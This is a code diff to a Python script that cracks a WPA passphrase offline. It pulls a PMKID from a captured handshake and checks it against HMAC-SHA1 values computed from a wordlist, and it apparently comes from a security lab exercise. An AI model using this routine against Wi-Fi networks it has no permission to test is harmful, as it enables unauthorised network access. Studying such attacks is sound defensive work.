@@ -12,7 +12,7 @@ packets = rdpcap("PMKID_handshake.pcap")
 handshake = None
 APmac       = a2b_hex(packets[145].addr3.replace(':',''))
 Clientmac   = a2b_hex(packets[145].addr1.replace(':',''))
-pmkid       = a2b_hex("7fd0bc061552217e942d19c6686f1598")[:6]
+pmkid       = None
 ssid = None
 
 def findSSID():
@@ -30,6 +30,9 @@ for packet in packets:
         if ssid != None:
             break
 
+# compute pmkid form packet
+pmkid = b2a_hex(handshake.load)[-32:-20]
+
 # read wordlist line by line
 with open('wordlist.txt') as fp:
     passPhrase = fp.readline()[:-1]
@@ -42,7 +45,7 @@ with open('wordlist.txt') as fp:
         computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]
 
         # compare the PMKIDs
-        if b2a_hex(pmkid) == b2a_hex(computed_pmkid):
+        if pmkid == b2a_hex(computed_pmkid):
             found = True
             print("The key was found ! It is : ", passPhrase)
 
